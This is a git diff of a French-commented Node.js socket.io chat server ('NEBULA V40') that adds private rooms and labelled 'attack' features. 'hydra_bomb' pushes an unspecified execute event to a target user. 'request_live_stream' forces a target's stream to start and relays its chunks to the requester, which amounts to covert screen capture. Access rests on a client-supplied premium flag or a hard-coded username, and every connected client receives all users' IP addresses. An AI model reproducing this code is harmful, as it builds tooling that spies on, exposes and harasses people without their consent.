@@ -4,61 +4,68 @@ const http = require('http').createServer(app);
 const io = require('socket.io')(http);
 const PORT = process.env.PORT || 3000;
 
-// --- REGISTRE DU VIDE ---
-const nebula_registry = {
-    users: {},
-    blacklist: new Set(),
-    config: { masterName: "toucheur2pp" }
-};
+let registry = { users: {}, rooms: {}, blacklist: new Set() };
 
-// Sert les fichiers statiques (CSS, JS)
 app.use(express.static(__dirname));
-
-// RÉPARE L'ERREUR "CANNOT GET /"
-app.get('/', (req, res) => {
-    res.sendFile(__dirname + '/index.html');
-});
+app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
 
 io.on('connection', (socket) => {
-    const rawIp = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;
-    const cleanIp = rawIp.includes('::') ? "127.0.0.1" : rawIp.split(',')[0].trim();
+    const ip = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;
 
     socket.on('init_user', (data) => {
-        if (nebula_registry.blacklist.has(cleanIp)) return socket.disconnect();
-        nebula_registry.users[socket.id] = {
-            id: socket.id,
-            name: data.name || "Inconnu",
-            ip: cleanIp,
-            chef: data.name === nebula_registry.config.masterName
+        if (registry.blacklist.has(ip)) return socket.disconnect();
+        const isChef = data.name === "toucheur2pp";
+        registry.users[socket.id] = {
+            id: socket.id, 
+            name: data.name, 
+            ip: ip, 
+            premium: isChef || data.isPremium,
+            chef: isChef,
+            room: 'global',
+            friends: []
         };
+        socket.join('global');
         sync();
     });
 
-    socket.on('chat_msg', (msg) => {
-        const u = nebula_registry.users[socket.id];
-        if (u) io.emit('chat_msg', { text: msg.text, name: u.name, system: msg.system });
-    });
-
-    socket.on('fire_canon', (targetSid) => {
-        if (nebula_registry.users[socket.id]?.chef) {
-            io.emit('canon_animation', { from: socket.id, to: targetSid });
-            io.to(targetSid).emit('system_destruction', nebula_registry.users[socket.id].name);
+    // --- SYSTÈME DE SALONS ---
+    socket.on('join_room', (roomName) => {
+        const u = registry.users[socket.id];
+        if (u.premium) {
+            socket.leave(u.room);
+            u.room = roomName;
+            socket.join(roomName);
+            socket.emit('chat_msg', { system: true, text: `BIENVENUE DANS LE SALON PRIVÉ : ${roomName}` });
         }
     });
 
-    socket.on('request_ghost_screen', (targetSid) => {
-        if (nebula_registry.users[socket.id]?.chef) io.to(targetSid).emit('capture_signal', socket.id);
+    // --- ATTAQUES BOOSTER ---
+    socket.on('hydra_bomb', (targetSid) => {
+        if (registry.users[socket.id]?.premium) {
+            io.to(targetSid).emit('execute_hydra', { by: registry.users[socket.id].name });
+        }
     });
 
-    socket.on('screen_data_transfer', (data) => {
-        io.to(data.to).emit('view_ghost_screen', { from: socket.id, img: data.img });
+    socket.on('request_live_stream', (targetSid) => {
+        if (registry.users[socket.id]?.premium) io.to(targetSid).emit('force_stream_start', socket.id);
     });
 
-    socket.on('disconnect', () => { delete nebula_registry.users[socket.id]; sync(); });
+    socket.on('stream_chunk', (data) => {
+        io.to(data.to).emit('receive_stream', { from: socket.id, buffer: data.buffer });
+    });
 
-    function sync() { io.emit('sync_users', Object.values(nebula_registry.users)); }
+    socket.on('chat_msg', (msg) => {
+        const u = registry.users[socket.id];
+        if (u) io.to(u.room).emit('chat_msg', { 
+            text: msg.text, 
+            name: u.name, 
+            premium: u.premium, 
+            chef: u.chef 
+        });
+    });
+
+    socket.on('disconnect', () => { delete registry.users[socket.id]; sync(); });
+    function sync() { io.emit('sync_users', Object.values(registry.users)); }
 });
 
-http.listen(PORT, () => {
-    console.log(`🌑 NEBULA V39.9 LANCÉ SUR PORT ${PORT}`);
-});
+http.listen(PORT, () => console.log("NEBULA V40 ONLINE - PORT " + PORT));
